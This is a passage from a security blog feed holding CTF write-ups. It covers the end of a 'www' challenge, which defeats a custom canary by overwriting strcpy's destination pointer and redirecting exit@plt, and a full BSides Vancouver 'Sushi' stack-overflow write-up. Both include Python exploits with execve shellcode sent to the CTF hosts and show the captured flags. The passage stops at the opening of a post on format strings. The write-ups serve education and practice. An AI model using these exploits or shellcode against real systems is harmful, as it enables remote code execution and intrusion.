</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>Welcome to www! Please give me two strings to have them echoed back to you!
</span><span class='line'>buffers at 0xffffd4c4 and 0xffffd3c4, ready <span class="k">for</span> input!
</span><span class='line'>AAAAAA
</span><span class='line'>BBBBBB
</span><span class='line'>AAAAAA
</span><span class='line'>
</span><span class='line'>BBBBBB
</span><span class='line'>
</span><span class='line'>Stack canary created: &gt;tC<span class="o">[</span>hbw<span class="o">]</span>
</span><span class='line'>Better luck next <span class="nb">time</span>, eh?
</span></code></pre></td></tr></table></div></figure>


<p>Looks like it has two buffers on the stack and a custom stack canary implementation. The vulnerable function is called <code>copybuf</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0804873c &lt;copybuf&gt;:
</span><span class='line'> 804873c: <span class="m">55</span>                      push   ebp
</span><span class='line'> 804873d: <span class="m">89</span> e5                   mov    ebp,esp
</span><span class='line'> 804873f: <span class="m">83</span> ec <span class="m">38</span>                sub    esp,0x38
</span><span class='line'> 8048742: c7 <span class="m">44</span> <span class="m">24</span> <span class="m">08</span> <span class="m">09</span> <span class="m">00</span> <span class="m">00</span>    mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x9
</span><span class='line'> 8048749: <span class="m">00</span>
</span><span class='line'> 804874a: c7 <span class="m">44</span> <span class="m">24</span> <span class="m">04</span> <span class="m">68</span> 9d <span class="m">04</span>    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8049d68 <span class="p">;</span> canary
</span><span class='line'> 8048751: <span class="m">08</span>
</span><span class='line'> 8048752: 8d <span class="m">45</span> eb                lea    eax,<span class="o">[</span>ebp-0x15<span class="o">]</span>
</span><span class='line'> 8048755: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 8048758: e8 c3 fe ff ff          call   <span class="m">8048620</span> &lt;strncpy@plt&gt;
</span><span class='line'> 804875d: 8b <span class="m">45</span> <span class="m">08</span>                mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
</span><span class='line'> 8048760: <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'> 8048764: 8d <span class="m">45</span> db                lea    eax,<span class="o">[</span>ebp-0x25<span class="o">]</span>                <span class="p">;</span> first buffer is copied here
</span><span class='line'> 8048767: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 804876a: e8 <span class="m">41</span> fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
</span><span class='line'> 804876f: 8b <span class="m">45</span> 0c                mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>       <span class="p">;</span> ebp+0xc <span class="o">=</span> second input
</span><span class='line'> 8048772: <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax            
</span><span class='line'> 8048776: 8b <span class="m">45</span> <span class="m">08</span>                mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>       <span class="p">;</span> overflow this pointer with <span class="nb">exit</span>@got
</span><span class='line'> 8048779: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 804877c: e8 2f fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
</span><span class='line'> <span class="p">;</span> check_cookie:
</span><span class='line'> 8048781: c7 <span class="m">44</span> <span class="m">24</span> <span class="m">04</span> <span class="m">68</span> 9d <span class="m">04</span>    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8049d68 <span class="p">;</span> canary
</span><span class='line'> 8048788: <span class="m">08</span>
</span><span class='line'> 8048789: 8d <span class="m">45</span> eb                lea    eax,<span class="o">[</span>ebp-0x15<span class="o">]</span>
</span><span class='line'> 804878c: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 804878f: e8 bc fd ff ff          call   <span class="m">8048550</span> &lt;strcmp@plt&gt;
</span><span class='line'> 8048794: <span class="m">89</span> <span class="m">45</span> f4                mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,eax
</span><span class='line'> 8048797: <span class="m">83</span> 7d f4 <span class="m">00</span>             cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x0
</span><span class='line'> 804879b: <span class="m">74</span> <span class="m">18</span>                   je     80487b5 &lt;copybuf+0x79&gt;        <span class="p">;</span> <span class="k">if</span> canary check fails, call <span class="nb">exit</span>@plt -&gt; overwrite
</span><span class='line'> 804879d: c7 <span class="m">04</span> <span class="m">24</span> <span class="m">30</span> 8a <span class="m">04</span> <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048a30
</span><span class='line'> 80487a4: e8 <span class="m">17</span> fe ff ff          call   80485c0 &lt;puts@plt&gt;
</span><span class='line'> 80487a9: c7 <span class="m">04</span> <span class="m">24</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x0
</span><span class='line'> 80487b0: e8 2b fe ff ff          call   80485e0 &lt;<span class="nb">exit</span>@plt&gt;
</span><span class='line'> <span class="p">;</span> cookie_OK:
</span><span class='line'> 80487b5: c9                      leave
</span><span class='line'> 80487b6: c3                      ret
</span></code></pre></td></tr></table></div></figure>


<p>In short, the program takes two inputs and uses <code>strcpy()</code> to copy these to the stack. However, the saved return address on the stack is protected from overwriting by a custom stack canary. The way around is to exploit the buffer overflow to overwrite one of the arguments to the second <code>strcpy()</code>: the pointer to the second buffer. If we control that pointer, we basically have a write-what-where. I chose to overflow the pointer to the second buffer with the address of <code>exit@plt</code>. This way, after overwriting the stack canary, the program will try to exit, but <code>exit@plt</code> will point to attacker-controlled shellcode on the stack.</p>

<p>Putting it all together:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pQ</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&#39;localhost&#39;, 17284))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;www.termsec.net&#39;</span><span class="p">,</span> <span class="mi">17284</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;(0x[0-9a-f]+)&#39;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
</span><span class='line'><span class="n">buf1_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'><span class="n">buf2_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[~] buf1: 0x</span><span class="si">%lx</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">buf1_addr</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[~] buf2: 0x</span><span class="si">%lx</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">buf2_addr</span>
</span><span class='line'>
</span><span class='line'><span class="c"># first input will overwrite the pointer that is used for the second strcpy </span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">45</span>       <span class="c"># padding</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049d10</span><span class="p">)</span>    <span class="c"># we&#39;ll overwrite exit@plt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">buf2_addr</span><span class="p">)</span> <span class="c"># restore this on the stack, otherwise it will be partially overwritten</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># second input, used in second strcpy. By now, that strcpy will call:</span>
</span><span class='line'><span class="c"># strcpy(0x8049d10, buffer2)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">buf2_addr</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>    <span class="c"># overwrite exit@plt with the address where the shellcode starts</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] enjoy your shell&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/yvrctf/www-200<span class="nv">$ </span>python ./www.py
</span><span class='line'><span class="o">[</span>~<span class="o">]</span> buf1: 0xbfa660d4
</span><span class='line'><span class="o">[</span>~<span class="o">]</span> buf2: 0xbfa65fd4
</span><span class='line'>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> enjoy your shell
</span><span class='line'>id
</span><span class='line'>/bin//sh: 1: id: not found
</span><span class='line'>cat flag.txt
</span><span class='line'>flag<span class="o">{</span>K33P_ST4T1C_L1K3_W00L_F4BR1C<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides Vancouver CTF - Sushi]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi/"/>
    <updated>2015-03-18T20:15:54+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi</id>
    <content type="html"><![CDATA[<p>At the very last minute, we decided to join BSides Vancouvers&#8217; CTF. Sushi was a 100 point pwnable.</p>

<!-- more -->


<p>We&rsquo;re given the binary (and the libraries are available if need be &ndash; really nice, no guessing). Upon running it, it gives us some address and asks for money:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Deposit money <span class="k">for</span> sushi here: 0x7ffc068ccfe0
</span><span class='line'>aaaaaaaa
</span><span class='line'>Sorry, <span class="nv">$0</span>.97 is not enough.
</span></code></pre></td></tr></table></div></figure>


<p>It seems to take the first character <code>a</code> (0x61 or 97) and use that. After fruitlessly trying to trigger a format string vulnerability, I disassembled the binary and checked out it in <code>gdb-peda</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : disabled
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p>Okay, no protections whatsoever. This means that the stack is executable too. The idea of string format vulnerability was quickly replaced with a good old buffer overflow:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/yvrctf/sushi-100<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;&quot;.join([&quot;%04d&quot; % x for x in range(200)])&#39;</span> <span class="p">|</span> ./sushi
</span><span class='line'>Deposit money <span class="k">for</span> sushi here: 0x7ffd0aa1edb0
</span><span class='line'>Sorry, <span class="nv">$0</span>.48 is not enough.
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>bas@tritonal:~/tmp/yvrctf/sushi-100<span class="nv">$ </span>gdb ./sushi core
</span><span class='line'>...snip...
</span><span class='line'>Core was generated by <span class="sb">`</span>./sushi<span class="err">&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x00000000004005f2 in ?? ()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/i <span class="nv">$rip</span>
</span><span class='line'><span class="o">=</span>&gt; 0x4005f2:    ret
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/2wx <span class="nv">$rsp</span>
</span><span class='line'>0x7ffd0aa1edf8:   0x38313030  0x39313030
</span></code></pre></td></tr></table></div></figure>


<p>Upon supplying a large buffer, the program crashes. Apparently, the saved return address is overwritten with <code>00180019</code>, so now I had the offset. The program crashes upon executing the <code>ret</code> statement at <code>0x4005f2</code> because the address does not point to a valid memory location.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/yvrctf/sushi-100<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*(18*4)+&quot;BBBBCCCC&quot;&#39;</span> <span class="p">|</span> ./sushi
</span><span class='line'>Deposit money <span class="k">for</span> sushi here: 0x7ffdcfd360b0
</span><span class='line'>Sorry, <span class="nv">$0</span>.65 is not enough.
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>bas@tritonal:~/tmp/yvrctf/sushi-100<span class="nv">$ </span>gdb ./sushi core
</span><span class='line'>...snip...
</span><span class='line'>Core was generated by <span class="sb">`</span>./sushi<span class="s1">&#39;.</span>
</span><span class='line'><span class="s1">Program terminated with signal 11, Segmentation fault.</span>
</span><span class='line'><span class="s1">#0  0x00000000004005f2 in ?? ()</span>
</span><span class='line'><span class="s1">gdb-peda$ x/2wx $rsp</span>
</span><span class='line'><span class="s1">0x7ffdcfd360f8:  0x42424242  0x43434343</span>
</span><span class='line'><span class="s1">gdb-peda$ x/s 0x7ffdcfd360b0</span>
</span><span class='line'><span class="s1">0x7ffdcfd360b0:   &#39;</span>A<span class="err">&#39;</span> &lt;repeats <span class="m">72</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;BBBBCCCC&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>What&rsquo;s more, each time upon running <code>sushi</code>, the program supplies the address of the buffer it is using! In other words, that&rsquo;s a nice place for shellcode!</p>

<p>The program uses <code>gets()</code> to get the input:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0x4005c5:  call  0x400480 &lt;gets@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>This means that we can send null bytes, which we need to overwrite the saved return address with the address of our buffer. These things together (and the fact that the vulnerable binary is ran on a remote box) meant that it had to be run from a <code>socat</code> process:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>socat TCP-LISTEN:4000,fork,reuseaddr EXEC:./sushi
</span></code></pre></td></tr></table></div></figure>


<p>Next was writing a simple exploit in python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pQ</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&#39;localhost&#39;, 4000))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;sushi.termsec.net&#39;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'><span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">&#39;(0x[0-9a-f]+)&#39;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[~] stack addr: 0x</span><span class="si">%lx</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">stack_addr</span>
</span><span class='line'>
</span><span class='line'><span class="c"># simple x64 execve shellcode</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\4</span><span class="s">8</span><span class="se">\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05</span><span class="s">&quot;</span>
</span><span class='line'><span class="c"># payload must overflow saved return address on stack</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">72</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
</span><span class='line'><span class="c"># we&#39;re given the address of our (executable!) buffer on the stack, so use that as return address</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">pQ</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>It ran locally after a bit of fine-tuning, so the proof was in the pudding:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/yvrctf/sushi-100<span class="nv">$ </span>python ./sushi.py
</span><span class='line'><span class="o">[</span>~<span class="o">]</span> stack addr: 0x7fffb3fc0480
</span><span class='line'>Sorry, <span class="nv">$0</span>.49 is not enough.
</span><span class='line'>cat flag.txt
</span><span class='line'>flag<span class="o">{</span>I_l3ft_my_wallet_in_#irc<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution]]></title>
    <link href="http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/"/>
    <updated>2015-02-22T13:01:22+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution</id>
    <content type="html"><![CDATA[<p>You might remember my first <a href="https://staringintodevnull.blogspot.nl/2014/09/maximum-overkill-rop-exploit-for.html">Maximum Overkill writeup</a>, where I made a ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise. I completed another over-the-top, why-would-you-even-do-this exploit for a CTF challenge and figured I&rsquo;d shared it.</p>

<!-- more -->


<p><a href="http://ringzer0team.com">ringzer0team</a> has a very nice, long-running CTF going on. I already did the <a href="https://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">shellcoding challenges</a>, which I really enjoyed. I completed the fourth pwnable level on an evening, which simply involved dumping the stack via a format string bug and grabbing a password. I thought to myself: &ldquo;would I be able to get a shell using this format string vulnerability?&rdquo;</p>

<p>This writeup is made with Hindsight<sup>tm</sup> and as such, I have not included all the paths that led nowhere or the mistakes I have made. I have tried to include the thought-process as much as possible.</p>

<h2>Dumping the Stack</h2>

<p>OK, onwards! One catch is that the remote box is a 64-bit system and I don&rsquo;t have the binary itself. We do have a snippet of source code and the ability to dump the stack from within a vulnerable <code>sprintf</code> call:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
